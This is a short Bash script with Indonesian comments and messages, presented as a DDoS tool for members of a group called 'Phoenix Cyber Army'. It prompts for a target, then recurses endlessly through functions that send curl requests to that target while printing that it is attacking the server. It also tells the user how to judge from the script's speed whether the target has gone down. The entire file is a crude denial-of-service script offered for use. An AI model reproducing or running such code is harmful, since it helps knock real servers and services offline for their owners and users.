#usr/bin/bash
clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
# Jangan Recode Ya gayn
# yang Recode Besok  Mati Amin
echo $ku
echo "  _____  _     _  _____  _______ __   _ _____ _     _
 |_____] |_____| |     | |______ | \  |   |    \___/ 
 |       |     | |_____| |______ |  \_| __|__ _/   \_
                                                     
"
echo $i
echo "[!] Cara Kerjanya [!]"
echo " "
echo "Jika DDoSnya Berjalan lama artinya Bekerja"
echo " "
echo "Jika DDoSnya Tiba² Cepat,, Artinya Down"
echo $me
echo "<-----[ Senjatanya Para Member Phoenix Cyber Army ]----->"
echo $pur
read -p "[TARGET]:~# " IP
echo          
phoenix(){
curl -y 5 -Y 13500 -s -m 1 $IP
echo $ku"Phoenix"$me sedang menyerang server"$i <--[ $IP ]-->"
echo    
curl -y 5 -Y 13500 -s -m 1 $IP
echo $ku"Phoenix"$me sedang menyerang server"$cy <--[ $IP ]-->"
echo    
}
asuh(){
phoenix
ddos
}
ddos(){
asuh
}
ddos
